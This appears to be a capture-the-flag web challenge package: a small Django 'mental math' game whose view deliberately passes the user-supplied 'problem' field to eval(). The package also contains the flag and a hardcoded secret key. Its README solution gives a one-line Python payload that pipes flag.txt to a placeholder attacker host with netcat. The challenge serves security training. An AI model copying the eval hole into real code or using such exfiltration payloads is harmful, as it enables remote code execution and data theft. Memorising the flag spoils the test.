{
    ".dockerignore": "README.md\nDockerfile\ndocker-compose.yml\n",
    "db.sqlite3": "[Binary file or unsupported type: sqlite3]",
    "docker-compose.yml": "version: '2'\n\nservices:\n  app:\n    build:\n      context: .\n      dockerfile: ./Dockerfile\n    ports:\n      - \"8000:8000\"\n    restart: always\n",
    "Dockerfile": "# https://www.caktusgroup.com/blog/2017/03/14/production-ready-dockerfile-your-python-django-app/\n\nFROM python:3.7-slim\n\n# Install packages needed to run your application (not build deps):\n# We need to recreate the /usr/share/man/man{1..8} directories first because\n# they were clobbered by a parent image.\nRUN set -ex \\\n    && RUN_DEPS=\" \\\n        libpcre3 \\\n        netcat \\\n    \" \\\n    && seq 1 8 | xargs -I{} mkdir -p /usr/share/man/man{} \\\n    && apt-get update && apt-get install -y --no-install-recommends $RUN_DEPS \\\n    && rm -rf /var/lib/apt/lists/*\n\n# Copy in your requirements file\nADD requirements.txt /requirements.txt\n\n# Install build deps, then run `pip install`, then remove unneeded build deps all in a single step.\n# Correct the path to your production requirements file, if needed.\nRUN set -ex \\\n    && BUILD_DEPS=\" \\\n        build-essential \\\n        libpcre3-dev \\\n        libpq-dev \\\n    \" \\\n    && apt-get update && apt-get install -y --no-install-recommends $BUILD_DEPS \\\n    && python3.7 -m venv /venv \\\n    && /venv/bin/pip install -U pip \\\n    && /venv/bin/pip install --no-cache-dir -r /requirements.txt \\\n    \\\n    && apt-get purge -y --auto-remove -o APT::AutoRemove::RecommendsImportant=false $BUILD_DEPS \\\n    && rm -rf /var/lib/apt/lists/*\n\n# Copy your application code to the container (make sure you create a .dockerignore file if any large files or directories should be excluded)\nRUN mkdir /code/\nWORKDIR /code/\nADD . /code/\n\n# uWSGI will listen on this port\nEXPOSE 8000\n\n# Add any static environment variables needed by Django or your settings file here:\nENV DJANGO_SETTINGS_MODULE=mentalmath.settings\n\n# Call collectstatic (customize the following line with the minimal environment variables needed for manage.py to run):\n# RUN DATABASE_URL='' /venv/bin/python manage.py --noinput\n\n# Tell uWSGI where to find your wsgi file (change this):\nENV UWSGI_WSGI_FILE=mentalmath/wsgi.py\n\n# Base uWSGI configuration (you shouldn't need to change these):\nENV UWSGI_VIRTUALENV=/venv UWSGI_HTTP=:8000 UWSGI_MASTER=1 UWSGI_HTTP_AUTO_CHUNKED=1 UWSGI_HTTP_KEEPALIVE=1 UWSGI_UID=1000 UWSGI_GID=2000 UWSGI_LAZY_APPS=1 UWSGI_WSGI_ENV_BEHAVIOR=holy\n\n# Number of uWSGI workers and threads per worker (customize as needed):\nENV UWSGI_WORKERS=2 UWSGI_THREADS=4\n\n# uWSGI static file serving configuration (customize or comment out if not needed):\n# ENV UWSGI_STATIC_MAP=\"/static/=/code/static/\" UWSGI_STATIC_EXPIRES_URI=\"/static/.*\\.[a-f0-9]{12,}\\.(css|js|png|jpg|jpeg|gif|ico|woff|ttf|otf|svg|scss|map|txt) 315360000\"\n\n# Deny invalid hosts before they get to Django (uncomment and change to your hostname(s)):\n# ENV UWSGI_ROUTE_HOST=\"^(?!localhost:8000$) break:400\"\n\n#ENTRYPOINT [\"/code/entry.sh\"]\n\n# Start uWSGI\nCMD [\"timeout\", \"-s\", \"2\", \"300\", \"/venv/bin/uwsgi\", \"--show-config\"]\n",
    "flag.txt": "gigem{1_4m_g0od_47_m4tH3m4aatics_n07_s3cUr1ty_h3h3h3he}\n",
    "manage.py": "#!/usr/bin/env python\nimport os\nimport sys\n\nif __name__ == '__main__':\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mentalmath.settings')\n    try:\n        from django.core.management import execute_from_command_line\n    except ImportError as exc:\n        raise ImportError(\n            \"Couldn't import Django. Are you sure it's installed and \"\n            \"available on your PYTHONPATH environment variable? Did you \"\n            \"forget to activate a virtual environment?\"\n        ) from exc\n    execute_from_command_line(sys.argv)\n",
    "README.md": "## Description\n\nMy first web app, check it out! `<insert-link>`\n\n## Documentation\n\nA pretty simple Django Python `eval` vuln. The hard part is deducing that there may be an\n`eval` present here, and also figuring out that this is a Django app. There is a comment\nin one of the HTML files with leftover Django templating which serves as a hint. It teaches\nparticipants how to think like an attacker in that the fact that the math problem\nis sent over AJAX back to the server might mean it is being passed to an `eval`.\n\n### Setup\n\n1. `docker-compose build`\n2. `docker-compose up`\n\nNote: will have to change `ALLOWED_HOSTS` in Django and the `UWSGI_ROUTE_HOST` environment variable in\nthe Dockerfile once we know where this will be hosted.\n\nAlso note that since we give arbitrary code execution, the server is restarted every five minutes.\n## Solution\n\nThe `problem` parameter to the endpoint `new_problem` is `eval()`ed. So one can send the following\nin this parameter (and setup a listener on `<attacker-ip>` of course) to get the flag.\n```python\n__import__('os').popen('cat flag.txt | nc <attacker-ip> <attacker-port>')\n```\n\n",
    "requirements.txt": "Django>=2.2rc1,<2.3\nuwsgi>=2.0,<2.1\n# Prevent pip from installing the binary wheel for psycopg2; see:\n# http://initd.org/psycopg/docs/install.html#disabling-wheel-packages-for-psycopg-2-7\npsycopg2>=2.7,<2.8 --no-binary psycopg2\n",
    "mathgame\\admin.py": "from django.contrib import admin\n\n# Register your models here.\n",
    "mathgame\\apps.py": "from django.apps import AppConfig\n\n\nclass MathgameConfig(AppConfig):\n    name = 'mathgame'\n",
    "mathgame\\models.py": "from django.db import models\n\n# Create your models here.\n",
    "mathgame\\tests.py": "from django.test import TestCase\n\n# Create your tests here.\n",
    "mathgame\\urls.py": "from django.urls import path\n\nfrom . import views\n\nurlpatterns = [\n    path('', views.index, name='index'),\n    path('play/', views.play, name='play'),\n    path('ajax/new_problem', views.new_problem, name='new_problem'),\n]\n",
    "mathgame\\views.py": "from django.shortcuts import render\nfrom django.http import JsonResponse\nimport random\n\ndef index(request):\n    return render(request, 'mathgame/index.html')\n\ndef play(request):\n    return render(request, 'mathgame/play.html')\n\ndef new_problem(request):\n    response_data = {}\n\n    if request.method == \"POST\" and request.is_ajax() and len(request.POST['problem']) > 0:\n        problem = request.POST['problem']\n        answer = request.POST['answer']\n        if eval(problem) == int(answer):\n            response_data['correct'] = True\n            response_data['problem'] = gen_problem()\n        else:\n            response_data['correct'] = False\n    else:\n        response_data['correct'] = True\n        response_data['problem'] = gen_problem()\n\n    return JsonResponse(response_data)\n\ndef gen_problem():\n    ops = '+*-'\n    a, b = random.randint(0, 100), random.randint(0, 100)\n    return str(a) + ' ' + random.choice(ops) + ' ' + str(b)\n",
    "mathgame\\__init__.py": "",
    "mathgame\\migrations\\__init__.py": "",
    "mathgame\\templates\\mathgame\\base.html": "<!doctype html>\n\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n\n    <title>mEnTaL MaTh</title>\n    <meta name=\"description\" content=\"A game for the wise.\">\n    <meta name=\"author\" content=\"Arithmetic King\">\n\n    <!--% block css %}{% endblock %-->\n\n    <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm\" crossorigin=\"anonymous\">\n  </head>\n\n  <body>\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\"></script> \n    <div class=\"container\">\n      {% block content %}{% endblock %}\n    </div>\n  </body>\n</html>\n\n\n",
    "mathgame\\templates\\mathgame\\index.html": "{% extends 'mathgame/base.html' %}\n\n{% block content %}\n<div class=\"row mt-3\">\n  <div class=\"col-sm-12 text-center\"><h1>mEnTaL mAtH</h1></div>\n</div>\n\n<div class=\"row\">\n  <div class=\"col-sm-8 offset-sm-2\">\n    <p>I created this tool to improve my mental math abilities. Simply click play, and you will be\n    met with an unending stream of meticulously crafted (okay, randomly generated) math problems.\n    As soon as you input the correct answer, a new problem will appear (no submit button, #ajax).\n    If you want to improve, don't use pen and paper!</p>\n  </div>\n</div>\n\n<div class=\"row\">\n  <div class=\"col-sm-12 text-center\">\n    <a href=\"{% url 'play' %}\">Start Game</a>\n  </div>\n</div>\n{% endblock %}\n",
    "mathgame\\templates\\mathgame\\play.html": "{% extends 'mathgame/base.html' %}\n\n{% block content %}\n\n<div class=\"row mt-5\">\n  <div class=\"col-sm-12 text-center\"> <h1 id=\"problem\"></h1> </div>\n  <div class=\"col-sm-12 text-center\"> <input name=\"answer\" type=\"text\" style=\"font-size: 24px; width: 150px;\" id=\"answer\"> </div>\n</div>\n\n<div class=\"row mt-2\">\n  <div class=\"col-sm-12 text-center\"><p>Sharpen your mind!</p></div>\n</div>\n\n<div class=\"row mt-1\">\n  <div class=\"col-sm-12 text-center\"><a href=\"{% url 'index' %}\">Go back</a></div>\n</div>\n\n<script>\n  function submitProblem() {\n    $.post(\"{% url 'new_problem' %}\", {'problem': $(\"#problem\").html(), 'answer': $('#answer').val()}, function ( data ) {\n      if (data.correct) {\n        $('#problem').html(data.problem);\n        $('#answer').val('');\n      }\n    });\n  }\n\n$(document).ready(function() {\n  $(\"#answer\").on('input', submitProblem);\n  submitProblem();\n});\n</script>\n\n{% endblock %}\n",
    "mentalmath\\settings.py": "\"\"\"\nDjango settings for mentalmath project.\n\nGenerated by 'django-admin startproject' using Django 2.1.1.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/2.1/ref/settings/\n\"\"\"\n\nimport os\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '=rn(%@c-#vf0-9l4ph3qqh^e2neo_6#c(^t!0dpe-&f67p$j3a'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = False\n\nALLOWED_HOSTS = ['127.0.0.1', 'localhost']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'mathgame',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'mentalmath.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'mentalmath.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/2.1/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/2.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/2.1/howto/static-files/\n\nSTATIC_URL = '/static/'\n",
    "mentalmath\\urls.py": "\"\"\"mentalmath URL Configuration\n\nThe `urlpatterns` list routes URLs to views. For more information please see:\n    https://docs.djangoproject.com/en/2.1/topics/http/urls/\nExamples:\nFunction views\n    1. Add an import:  from my_app import views\n    2. Add a URL to urlpatterns:  path('', views.home, name='home')\nClass-based views\n    1. Add an import:  from other_app.views import Home\n    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')\nIncluding another URLconf\n    1. Import the include() function: from django.urls import include, path\n    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))\n\"\"\"\nfrom django.contrib import admin\nfrom django.urls import include, path\n\nurlpatterns = [\n    path('', include('mathgame.urls')),\n    path('admin/', admin.site.urls),\n]\n",
    "mentalmath\\wsgi.py": "\"\"\"\nWSGI config for mentalmath project.\n\nIt exposes the WSGI callable as a module-level variable named ``application``.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/2.1/howto/deployment/wsgi/\n\"\"\"\n\nimport os\n\nfrom django.core.wsgi import get_wsgi_application\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mentalmath.settings')\n\napplication = get_wsgi_application()\n",
    "mentalmath\\__init__.py": "",
    "category": "Web"
}